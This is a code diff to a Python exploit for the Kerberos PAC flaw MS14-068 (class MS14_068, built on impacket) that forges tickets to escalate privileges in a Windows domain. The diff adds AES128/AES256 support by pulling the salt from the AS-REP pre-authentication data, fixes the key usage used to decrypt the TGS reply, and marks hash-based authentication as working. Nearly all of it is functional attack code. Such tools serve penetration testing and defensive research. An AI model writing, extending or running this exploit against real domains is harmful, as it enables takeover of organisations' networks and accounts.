@@ -19,8 +19,8 @@
 #   2) target must be a FQDN as well and matching the target's NetBIOS (not 100% sure)
 #   3) As of right now, it only supports SMB > 1, sorry old systems - DONE
 #   4) Lots of things might not work, testing needed!
-#   5) Ohh.. hashes still not working.. but that'll be easy
-#   6) Just RC4 at the moment
+#   5) Ohh.. hashes still not working.. but that'll be easy - DONE
+#   6) Just RC4 at the moment - DONE (aes128 and aes256 added)
 #   7) It won't work on Kerberos-only Domains (but can be fixed)
 #   8) Use WMIEXEC approach instead
 #
@@ -879,9 +879,9 @@ class MS14_068():
 
         reqBody['till'] = KerberosTime.to_asn1(now)
         reqBody['nonce'] = random.SystemRandom().getrandbits(31)
-        seq_set_iter(reqBody, 'etype', (int(constants.EncriptionTypes.rc4_hmac.value),))
+        seq_set_iter(reqBody, 'etype', (cipher.enctype,))
         reqBody['enc-authorization-data'] = None
-        reqBody['enc-authorization-data']['etype'] = int(constants.EncriptionTypes.rc4_hmac.value)
+        reqBody['enc-authorization-data']['etype'] = int(cipher.enctype)
         reqBody['enc-authorization-data']['cipher'] = encryptedEncodedIfRelevant
 
         apReq = AP_REQ()
@@ -914,7 +914,7 @@ class MS14_068():
         encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)
 
         apReq['authenticator'] = None
-        apReq['authenticator']['etype'] = int(constants.EncriptionTypes.rc4_hmac.value)
+        apReq['authenticator']['etype'] = cipher.enctype
         apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
 
         encodedApReq = encoder.encode(apReq)
@@ -942,11 +942,10 @@ class MS14_068():
         tgs = decoder.decode(r, asn1Spec = TGS_REP())[0]
         cipherText = tgs['enc-part']['cipher']
 
-        # Key Usage 3
-        # AS-REP encrypted part (includes TGS session key or
-        # application session key), encrypted with the client key
-        # (Section 5.4.2)        
-        plainText = cipher.decrypt(sessionKey, 3, str(cipherText))
+        # Key Usage 8
+        # TGS-REP encrypted part (includes application session
+        # key), encrypted with the TGS session key (Section 5.4.2)
+        plainText = cipher.decrypt(sessionKey, 8, str(cipherText))
 
         encTGSRepPart = decoder.decode(plainText, asn1Spec = EncTGSRepPart())[0]
 
@@ -982,19 +981,27 @@ class MS14_068():
         userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
         tgt, cipher, sessionKey = getKerberosTGT(userName, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__kdcHost, requestPAC=False)
         # So, we have the TGT, now extract the new session key and finish
-
         asRep = decoder.decode(tgt, asn1Spec = AS_REP())[0]
+
+        # If the cypher in use != RC4 there's gotta be a salt for us to use
+        salt = ''
+        if asRep['padata']:
+            for pa in asRep['padata']:
+                if pa['padata-type'] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
+                    etype2 = decoder.decode(str(pa['padata-value'])[2:], asn1Spec = ETYPE_INFO2_ENTRY())[0]
+                    enctype = etype2['etype']
+                    salt = str(etype2['salt']) 
+
         cipherText = asRep['enc-part']['cipher']
 
         # Key Usage 3
         # AS-REP encrypted part (includes TGS session key or
         # application session key), encrypted with the client key
         # (Section 5.4.2)
-        cipher = _RC4()
         if self.__nthash != '':
             key = Key(cipher.enctype,self.__nthash)
         else:
-            key = cipher.string_to_key(self.__password, None, None)
+            key = cipher.string_to_key(self.__password, salt, None)
 
         plainText = cipher.decrypt(key, 3, str(cipherText))
         encASRepPart = decoder.decode(plainText, asn1Spec = EncASRepPart())[0]
@@ -1043,7 +1050,7 @@ if __name__ == '__main__':
     from impacket.krb5.types import Principal, Ticket, KerberosTime
     from impacket.krb5 import constants
     from impacket.krb5.kerberosv5 import sendReceive, getKerberosTGT, getKerberosTGS
-    from impacket.krb5.asn1 import AS_REP, AS_REQ, TGS_REQ, AP_REQ, TGS_REP, Authenticator, EncASRepPart, AuthorizationData, AD_IF_RELEVANT, seq_set, seq_set_iter, KERB_PA_PAC_REQUEST, PA_ENC_TS_ENC, EncryptedData, EncTGSRepPart
+    from impacket.krb5.asn1 import AS_REP, AS_REQ, TGS_REQ, AP_REQ, TGS_REP, Authenticator, EncASRepPart, AuthorizationData, AD_IF_RELEVANT, seq_set, seq_set_iter, KERB_PA_PAC_REQUEST, PA_ENC_TS_ENC, EncryptedData, EncTGSRepPart, ETYPE_INFO2_ENTRY
     from impacket.krb5.crypto import _RC4, Key
     from impacket.dcerpc.v5.ndr import NDRULONG
     from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
